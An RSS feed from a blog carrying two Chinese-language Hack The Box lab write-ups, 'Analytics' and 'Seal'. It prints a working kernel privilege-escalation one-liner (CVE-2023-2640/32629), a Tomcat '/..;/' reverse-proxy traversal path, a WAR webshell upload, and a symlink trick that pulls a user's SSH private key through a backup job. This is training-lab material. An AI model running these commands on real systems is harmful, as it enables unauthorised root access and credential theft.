<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Htb on NergiganteS&#39;s Blog</title>
        <link>https://example.com/categories/htb/</link>
        <description>Recent content in Htb on NergiganteS&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Example Person</copyright>
        <lastBuildDate>Wed, 19 Mar 2025 14:34:54 +0800</lastBuildDate><atom:link href="https://example.com/categories/htb/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Analytics</title>
        <link>https://example.com/htb/analytics/</link>
        <pubDate>Wed, 19 Mar 2025 14:33:16 +0800</pubDate>
        
        <guid>https://example.com/htb/analytics/</guid>
        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
&lt;/h1&gt;&lt;p&gt;扫描端口正常1，有域名扫子域名正常，目录爆破也没东西&lt;/p&gt;
&lt;p&gt;在登录页面看到是matebases&lt;/p&gt;
&lt;p&gt;msf存在可以利用漏洞&lt;/p&gt;
&lt;p&gt;改参数执行拿到shell&lt;/p&gt;
&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
&lt;/h1&gt;&lt;p&gt;linpeas.sh扫不到东西&lt;/p&gt;
&lt;p&gt;uname -r查看内核&lt;/p&gt;
&lt;p&gt;发现适合&lt;/p&gt;
&lt;p&gt;CVE-2023-2640-CVE-2023-32629&lt;/p&gt;
&lt;p&gt;执行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;unshare -rm sh -c &amp;#34;mkdir l u w m &amp;amp;&amp;amp; cp /u*/b*/p*3 l/;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;amp;&amp;amp; touch m/*;&amp;#34; &amp;amp;&amp;amp; u/python3 -c &amp;#39;import os;os.setuid(0);os.system(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>Seal</title>
        <link>https://example.com/htb/seal/</link>
        <pubDate>Wed, 19 Mar 2025 14:05:44 +0800</pubDate>
        
        <guid>https://example.com/htb/seal/</guid>
        <description>&lt;p&gt;外网打点&lt;/p&gt;
&lt;p&gt;三板斧&lt;/p&gt;
&lt;p&gt;开了三个端口 22，443，8080&lt;/p&gt;
&lt;p&gt;有域名扫子域名无果&lt;/p&gt;
&lt;p&gt;扫目录&lt;img src=&#34;https://example.com/htb/seal/image.png&#34;
	width=&#34;860&#34;
	height=&#34;641&#34;
	srcset=&#34;https://example.com/htb/seal/image_hu9df0e9e6abb1dbe28ba326843e3a8c7d_86202_480x0_resize_box_3.png 480w, https://example.com/htb/seal/image_hu9df0e9e6abb1dbe28ba326843e3a8c7d_86202_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;134&#34;
		data-flex-basis=&#34;321px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;现在要么就是看不了要么就是要登录，看8080端口&lt;/p&gt;
&lt;p&gt;在一个历史版本里找到了用户密码&lt;img src=&#34;https://example.com/htb/seal/image2.png&#34;
	width=&#34;1028&#34;
	height=&#34;496&#34;
	srcset=&#34;https://example.com/htb/seal/image2_hu032c9733e9714094bdf1e768eac86e46_23244_480x0_resize_box_3.png 480w, https://example.com/htb/seal/image2_hu032c9733e9714094bdf1e768eac86e46_23244_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;497px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;登录了之前扫401的目录&lt;/p&gt;
&lt;p&gt;看/manger/status/all看不到管理界面&lt;/p&gt;
&lt;p&gt;看一下html的但是跳到nginx了。。。（这不是tomcat吗？）&lt;/p&gt;
&lt;p&gt;之后搜了下这是用nginx反向代理了tomcat&lt;/p&gt;
&lt;p&gt;之后看了其他大佬的wp&lt;/p&gt;
&lt;p&gt;这里存在一个目录穿越&lt;/p&gt;
&lt;p&gt;大体就是tomcat会将&lt;code&gt;/..;/&lt;/code&gt;解析成传统意义上的&lt;code&gt;/../&lt;/code&gt;，而nginx不会。所以nginx放过了本该拦截的URL访问，这样我们就能进入控制台了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Web servers and reverse proxies normalize the request path. For example, the path /image/../image/ is normalized to /images/ . When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;This allows an attacker to access Apache Tomcat resources that are not normally accessible via the reverse proxy mapping.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;/manger/status/..;/html进入到管理后台&lt;/p&gt;
&lt;p&gt;看到可以上传war文件上传一个🐎拿到shell&lt;/p&gt;
&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
&lt;/h1&gt;&lt;p&gt;找了半天找到一个run.yml&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- hosts: localhost
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  tasks:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  - name: Copy Files
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    synchronize: src=https://example.com/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  - name: Server Backups
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    archive:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      path: /opt/backups/files/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      dest: &amp;#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  - name: Clean
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    file:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      state: absent
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      path: /opt/backups/files/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;代码解释&lt;/p&gt;
&lt;p&gt;synchronize模块：其功能是把源目录/var/lib/tomcat9/webapps/ROOT/admin/dashboard复制到目标目录/opt/backups/files，并且复制符号链接。&lt;/p&gt;
&lt;p&gt;archive模块：将/opt/backups/files/目录打包成一个压缩文件，文件名包含当前日期和时间，存于/opt/backups/archives/目录下。&lt;/p&gt;
&lt;p&gt;file模块：把/opt/backups/files/目录删除。&lt;/p&gt;
&lt;p&gt;开启了copy_links，我们可以把一些好东西连接到/var/lib/tomcat9/webapps/ROOT/admin/dashboard目录下，然后让这个进程打包，之后我们再解压拿到东西&lt;/p&gt;
&lt;p&gt;正好我们有在/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads下写的权限&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://example.com/htb/seal/image3.png&#34;
	width=&#34;1048&#34;
	height=&#34;899&#34;
	srcset=&#34;https://example.com/htb/seal/image3_hub380d5171a6fbbbe81f30331af4212a4_102688_480x0_resize_box_3.png 480w, https://example.com/htb/seal/image3_hub380d5171a6fbbbe81f30331af4212a4_102688_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;116&#34;
		data-flex-basis=&#34;279px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;然后等待我们的id_rsa&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://example.com/htb/seal/image4.png&#34;
	width=&#34;880&#34;
	height=&#34;986&#34;
	srcset=&#34;https://example.com/htb/seal/image4_hu75cc4fcfb0d872c151bbeb27bedf17f5_168416_480x0_resize_box_3.png 480w, https://example.com/htb/seal/image4_hu75cc4fcfb0d872c151bbeb27bedf17f5_168416_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;89&#34;
		data-flex-basis=&#34;214px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ssh登录拿到user.txt&lt;/p&gt;
&lt;p&gt;sudo -l查看超级权限&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://example.com/htb/seal/image5.png&#34;
	width=&#34;479&#34;
	height=&#34;149&#34;
	srcset=&#34;https://example.com/htb/seal/image5_hu8468b9c391a969e83dfbb4a7b9ce0a20_12262_480x0_resize_box_3.png 480w, https://example.com/htb/seal/image5_hu8468b9c391a969e83dfbb4a7b9ce0a20_12262_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;321&#34;
		data-flex-basis=&#34;771px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://example.com/htb/seal/image6.png&#34;
	width=&#34;1240&#34;
	height=&#34;786&#34;
	srcset=&#34;https://example.com/htb/seal/image6_hu343ca78469915868e3976dbad24ca46f_39106_480x0_resize_box_3.png 480w, https://example.com/htb/seal/image6_hu343ca78469915868e3976dbad24ca46f_39106_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;157&#34;
		data-flex-basis=&#34;378px&#34;
	
&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
